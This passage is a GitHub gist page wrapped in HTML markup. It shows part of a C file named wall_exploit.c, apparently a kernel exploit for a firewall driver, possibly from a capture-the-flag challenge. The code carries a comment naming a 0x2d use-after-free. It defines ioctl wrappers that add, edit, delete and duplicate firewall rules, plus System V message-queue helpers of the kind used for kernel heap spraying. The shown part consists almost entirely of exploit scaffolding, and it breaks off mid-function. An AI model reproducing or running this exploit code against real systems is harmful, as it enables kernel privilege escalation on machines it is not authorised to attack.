          <td id="file-wall_exploit-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-wall_exploit-c-LC86" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; qwords; i+=<span class="pl-c1">2</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-wall_exploit-c-LC87" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-wall_exploit-c-LC88" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>0x<span class="pl-c1">%04llx</span>: 0x<span class="pl-c1">%016llx</span> 0x<span class="pl-c1">%016llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, (i * <span class="pl-c1">0x8</span>), ((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span>*)buffer)[i], ((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span>*)buffer)[i+<span class="pl-c1">1</span>]);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-wall_exploit-c-LC89" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-wall_exploit-c-LC90" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>-----------------------------------------------<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-wall_exploit-c-LC91" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-wall_exploit-c-LC92" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-wall_exploit-c-LC93" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-wall_exploit-c-LC94" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">gen_dot_notation</span>(<span class="pl-k">char</span> *buf, <span class="pl-c1">uint32_t</span> val)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-wall_exploit-c-LC95" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-wall_exploit-c-LC96" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">sprintf</span>(buf, <span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%d</span>.<span class="pl-c1">%d</span>.<span class="pl-c1">%d</span>.<span class="pl-c1">%d</span><span class="pl-pds">"</span></span>, val &amp; <span class="pl-c1">0x000000FF</span>, (val &amp; <span class="pl-c1">0x0000FF00</span>) &gt;&gt; <span class="pl-c1">8</span>, (val &amp; <span class="pl-c1">0x00FF0000</span>) &gt;&gt; <span class="pl-c1">16</span>, (val &amp; <span class="pl-c1">0xFF000000</span>) &gt;&gt; <span class="pl-c1">24</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-wall_exploit-c-LC97" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-wall_exploit-c-LC98" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-wall_exploit-c-LC99" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-wall_exploit-c-LC100" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span> we have a 0x2d UAF</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-wall_exploit-c-LC101" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">generate</span>(<span class="pl-k">char</span> *input, <span class="pl-c1">user_rule_t</span> *req)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-wall_exploit-c-LC102" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
          <td id="file-wall_exploit-c-LC103" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> addr[<span class="pl-c1">0x10</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-wall_exploit-c-LC104" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> ip = *(<span class="pl-c1">uint32_t</span> *)&amp;input[<span class="pl-c1">0x20</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-wall_exploit-c-LC105" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> netmask = *(<span class="pl-c1">uint32_t</span> *)&amp;input[<span class="pl-c1">0x24</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-wall_exploit-c-LC106" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-wall_exploit-c-LC107" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(addr, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(addr));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-wall_exploit-c-LC108" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">gen_dot_notation</span>(addr, ip);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-wall_exploit-c-LC109" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">ip</span>, addr, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-wall_exploit-c-LC110" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-wall_exploit-c-LC111" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(addr, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(addr));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-wall_exploit-c-LC112" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">gen_dot_notation</span>(addr, netmask);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L113" class="blob-num js-line-number js-code-nav-line-number" data-line-number="113"></td>
          <td id="file-wall_exploit-c-LC113" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">netmask</span>, addr, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L114" class="blob-num js-line-number js-code-nav-line-number" data-line-number="114"></td>
          <td id="file-wall_exploit-c-LC114" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L115" class="blob-num js-line-number js-code-nav-line-number" data-line-number="115"></td>
          <td id="file-wall_exploit-c-LC115" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">iface</span>, input, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L116" class="blob-num js-line-number js-code-nav-line-number" data-line-number="116"></td>
          <td id="file-wall_exploit-c-LC116" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">name</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x10</span>], <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L117" class="blob-num js-line-number js-code-nav-line-number" data-line-number="117"></td>
          <td id="file-wall_exploit-c-LC117" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">proto</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span>], <span class="pl-c1">2</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L118" class="blob-num js-line-number js-code-nav-line-number" data-line-number="118"></td>
          <td id="file-wall_exploit-c-LC118" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">port</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span> + <span class="pl-c1">2</span>], <span class="pl-c1">2</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L119" class="blob-num js-line-number js-code-nav-line-number" data-line-number="119"></td>
          <td id="file-wall_exploit-c-LC119" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">action</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span> + <span class="pl-c1">2</span> + <span class="pl-c1">2</span>], <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L120" class="blob-num js-line-number js-code-nav-line-number" data-line-number="120"></td>
          <td id="file-wall_exploit-c-LC120" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L121" class="blob-num js-line-number js-code-nav-line-number" data-line-number="121"></td>
          <td id="file-wall_exploit-c-LC121" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L122" class="blob-num js-line-number js-code-nav-line-number" data-line-number="122"></td>
          <td id="file-wall_exploit-c-LC122" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L123" class="blob-num js-line-number js-code-nav-line-number" data-line-number="123"></td>
          <td id="file-wall_exploit-c-LC123" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L124" class="blob-num js-line-number js-code-nav-line-number" data-line-number="124"></td>
          <td id="file-wall_exploit-c-LC124" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">ioctl</span>(<span class="pl-k">int</span> fd, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> request, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> param) <span class="pl-c"><span class="pl-c">//</span>ioctl wrapper</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L125" class="blob-num js-line-number js-code-nav-line-number" data-line-number="125"></td>
          <td id="file-wall_exploit-c-LC125" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L126" class="blob-num js-line-number js-code-nav-line-number" data-line-number="126"></td>
          <td id="file-wall_exploit-c-LC126" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-bu">syscall</span>(__NR_ioctl, fd, request, param);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L127" class="blob-num js-line-number js-code-nav-line-number" data-line-number="127"></td>
          <td id="file-wall_exploit-c-LC127" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L128" class="blob-num js-line-number js-code-nav-line-number" data-line-number="128"></td>
          <td id="file-wall_exploit-c-LC128" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L129" class="blob-num js-line-number js-code-nav-line-number" data-line-number="129"></td>
          <td id="file-wall_exploit-c-LC129" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">add</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">char</span> *buffer, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L130" class="blob-num js-line-number js-code-nav-line-number" data-line-number="130"></td>
          <td id="file-wall_exploit-c-LC130" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L131" class="blob-num js-line-number js-code-nav-line-number" data-line-number="131"></td>
          <td id="file-wall_exploit-c-LC131" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L132" class="blob-num js-line-number js-code-nav-line-number" data-line-number="132"></td>
          <td id="file-wall_exploit-c-LC132" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L133" class="blob-num js-line-number js-code-nav-line-number" data-line-number="133"></td>
          <td id="file-wall_exploit-c-LC133" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generate</span>(buffer, (<span class="pl-c1">user_rule_t</span> *)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L134" class="blob-num js-line-number js-code-nav-line-number" data-line-number="134"></td>
          <td id="file-wall_exploit-c-LC134" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L135" class="blob-num js-line-number js-code-nav-line-number" data-line-number="135"></td>
          <td id="file-wall_exploit-c-LC135" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L136" class="blob-num js-line-number js-code-nav-line-number" data-line-number="136"></td>
          <td id="file-wall_exploit-c-LC136" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, ADD_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L137" class="blob-num js-line-number js-code-nav-line-number" data-line-number="137"></td>
          <td id="file-wall_exploit-c-LC137" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L138" class="blob-num js-line-number js-code-nav-line-number" data-line-number="138"></td>
          <td id="file-wall_exploit-c-LC138" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L139" class="blob-num js-line-number js-code-nav-line-number" data-line-number="139"></td>
          <td id="file-wall_exploit-c-LC139" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> delete(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L140" class="blob-num js-line-number js-code-nav-line-number" data-line-number="140"></td>
          <td id="file-wall_exploit-c-LC140" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L141" class="blob-num js-line-number js-code-nav-line-number" data-line-number="141"></td>
          <td id="file-wall_exploit-c-LC141" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L142" class="blob-num js-line-number js-code-nav-line-number" data-line-number="142"></td>
          <td id="file-wall_exploit-c-LC142" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L143" class="blob-num js-line-number js-code-nav-line-number" data-line-number="143"></td>
          <td id="file-wall_exploit-c-LC143" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L144" class="blob-num js-line-number js-code-nav-line-number" data-line-number="144"></td>
          <td id="file-wall_exploit-c-LC144" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L145" class="blob-num js-line-number js-code-nav-line-number" data-line-number="145"></td>
          <td id="file-wall_exploit-c-LC145" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, DELETE_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L146" class="blob-num js-line-number js-code-nav-line-number" data-line-number="146"></td>
          <td id="file-wall_exploit-c-LC146" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L147" class="blob-num js-line-number js-code-nav-line-number" data-line-number="147"></td>
          <td id="file-wall_exploit-c-LC147" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L148" class="blob-num js-line-number js-code-nav-line-number" data-line-number="148"></td>
          <td id="file-wall_exploit-c-LC148" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">edit</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">char</span> *buffer, <span class="pl-k">int</span> type, <span class="pl-k">int</span> invalidate)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L149" class="blob-num js-line-number js-code-nav-line-number" data-line-number="149"></td>
          <td id="file-wall_exploit-c-LC149" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L150" class="blob-num js-line-number js-code-nav-line-number" data-line-number="150"></td>
          <td id="file-wall_exploit-c-LC150" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L151" class="blob-num js-line-number js-code-nav-line-number" data-line-number="151"></td>
          <td id="file-wall_exploit-c-LC151" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L152" class="blob-num js-line-number js-code-nav-line-number" data-line-number="152"></td>
          <td id="file-wall_exploit-c-LC152" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generate</span>(buffer, (<span class="pl-c1">user_rule_t</span> *)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L153" class="blob-num js-line-number js-code-nav-line-number" data-line-number="153"></td>
          <td id="file-wall_exploit-c-LC153" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L154" class="blob-num js-line-number js-code-nav-line-number" data-line-number="154"></td>
          <td id="file-wall_exploit-c-LC154" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L155" class="blob-num js-line-number js-code-nav-line-number" data-line-number="155"></td>
          <td id="file-wall_exploit-c-LC155" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (invalidate)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L156" class="blob-num js-line-number js-code-nav-line-number" data-line-number="156"></td>
          <td id="file-wall_exploit-c-LC156" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L157" class="blob-num js-line-number js-code-nav-line-number" data-line-number="157"></td>
          <td id="file-wall_exploit-c-LC157" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">strcpy</span>((<span class="pl-k">void</span> *)&amp;rule.<span class="pl-smi">ip</span>, <span class="pl-s"><span class="pl-pds">"</span>invalid<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L158" class="blob-num js-line-number js-code-nav-line-number" data-line-number="158"></td>
          <td id="file-wall_exploit-c-LC158" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">strcpy</span>((<span class="pl-k">void</span> *)&amp;rule.<span class="pl-smi">netmask</span>, <span class="pl-s"><span class="pl-pds">"</span>invalid<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L159" class="blob-num js-line-number js-code-nav-line-number" data-line-number="159"></td>
          <td id="file-wall_exploit-c-LC159" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L160" class="blob-num js-line-number js-code-nav-line-number" data-line-number="160"></td>
          <td id="file-wall_exploit-c-LC160" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, EDIT_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);   </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L161" class="blob-num js-line-number js-code-nav-line-number" data-line-number="161"></td>
          <td id="file-wall_exploit-c-LC161" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L162" class="blob-num js-line-number js-code-nav-line-number" data-line-number="162"></td>
          <td id="file-wall_exploit-c-LC162" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L163" class="blob-num js-line-number js-code-nav-line-number" data-line-number="163"></td>
          <td id="file-wall_exploit-c-LC163" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">duplicate</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L164" class="blob-num js-line-number js-code-nav-line-number" data-line-number="164"></td>
          <td id="file-wall_exploit-c-LC164" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L165" class="blob-num js-line-number js-code-nav-line-number" data-line-number="165"></td>
          <td id="file-wall_exploit-c-LC165" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L166" class="blob-num js-line-number js-code-nav-line-number" data-line-number="166"></td>
          <td id="file-wall_exploit-c-LC166" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L167" class="blob-num js-line-number js-code-nav-line-number" data-line-number="167"></td>
          <td id="file-wall_exploit-c-LC167" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L168" class="blob-num js-line-number js-code-nav-line-number" data-line-number="168"></td>
          <td id="file-wall_exploit-c-LC168" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L169" class="blob-num js-line-number js-code-nav-line-number" data-line-number="169"></td>
          <td id="file-wall_exploit-c-LC169" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, DUP_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L170" class="blob-num js-line-number js-code-nav-line-number" data-line-number="170"></td>
          <td id="file-wall_exploit-c-LC170" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L171" class="blob-num js-line-number js-code-nav-line-number" data-line-number="171"></td>
          <td id="file-wall_exploit-c-LC171" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L172" class="blob-num js-line-number js-code-nav-line-number" data-line-number="172"></td>
          <td id="file-wall_exploit-c-LC172" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">int32_t</span> <span class="pl-en">make_queue</span>(<span class="pl-c1">key_t</span> key, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L173" class="blob-num js-line-number js-code-nav-line-number" data-line-number="173"></td>
          <td id="file-wall_exploit-c-LC173" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L174" class="blob-num js-line-number js-code-nav-line-number" data-line-number="174"></td>
          <td id="file-wall_exploit-c-LC174" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">int32_t</span> result;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L175" class="blob-num js-line-number js-code-nav-line-number" data-line-number="175"></td>
          <td id="file-wall_exploit-c-LC175" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((result = <span class="pl-c1">msgget</span>(key, msgflg)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L176" class="blob-num js-line-number js-code-nav-line-number" data-line-number="176"></td>
          <td id="file-wall_exploit-c-LC176" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L177" class="blob-num js-line-number js-code-nav-line-number" data-line-number="177"></td>
          <td id="file-wall_exploit-c-LC177" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgget failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L178" class="blob-num js-line-number js-code-nav-line-number" data-line-number="178"></td>
          <td id="file-wall_exploit-c-LC178" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L179" class="blob-num js-line-number js-code-nav-line-number" data-line-number="179"></td>
          <td id="file-wall_exploit-c-LC179" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L180" class="blob-num js-line-number js-code-nav-line-number" data-line-number="180"></td>
          <td id="file-wall_exploit-c-LC180" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> result;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L181" class="blob-num js-line-number js-code-nav-line-number" data-line-number="181"></td>
          <td id="file-wall_exploit-c-LC181" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L182" class="blob-num js-line-number js-code-nav-line-number" data-line-number="182"></td>
          <td id="file-wall_exploit-c-LC182" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L183" class="blob-num js-line-number js-code-nav-line-number" data-line-number="183"></td>
          <td id="file-wall_exploit-c-LC183" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">get_msg</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">void</span> *msgp, <span class="pl-c1">size_t</span> msgsz, <span class="pl-k">long</span> msgtyp, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L184" class="blob-num js-line-number js-code-nav-line-number" data-line-number="184"></td>
          <td id="file-wall_exploit-c-LC184" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L185" class="blob-num js-line-number js-code-nav-line-number" data-line-number="185"></td>
